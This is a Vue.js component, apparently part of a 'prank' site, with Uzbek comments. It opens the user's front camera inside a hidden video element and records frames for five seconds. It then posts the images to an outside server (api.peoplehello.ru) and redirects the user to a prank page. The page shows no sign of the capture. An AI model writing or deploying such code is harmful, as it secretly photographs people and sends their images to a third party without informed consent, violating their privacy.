<template>
  <!-- UI ko‘rinmaydi -->
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
export default {
  data() {
    return {
      frames: [],
      session_id: null,
      capturing: false
    }
  },

  async mounted() {
    this.session_id = this.$route.params.id
    if (!this.session_id) return

    await this.startCapture()
  },

  methods: {
    async startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        })

        const video = this.$refs.video
        video.srcObject = stream
        await video.play()

        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480
        const ctx = canvas.getContext("2d")

        this.frames = []
        this.capturing = true

        const start = Date.now()

        // 📸 10 FPS
        const interval = setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
          const base64 = canvas.toDataURL("image/jpeg", 0.8)
          this.frames.push(base64)

          // ⏱ 5 soniya
          if (Date.now() - start >= 5000) {
            clearInterval(interval)
            stream.getTracks().forEach(t => t.stop())
            this.sendFrames()
          }
        }, 100)

      } catch (e) {
        console.error("Camera error:", e)
      }
    },

    async sendFrames() {
      try {
        await fetch("https://api.peoplehello.ru/api/frames-to-video", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            session_id: this.session_id,
            frames: this.frames
          })
        })
      } catch (e) {
        console.error("Send error:", e)
      } finally {
        // prank sahifaga qaytish
        this.$router.push(`/prank/${this.session_id}`)
      }
    }
  }
}
</script>
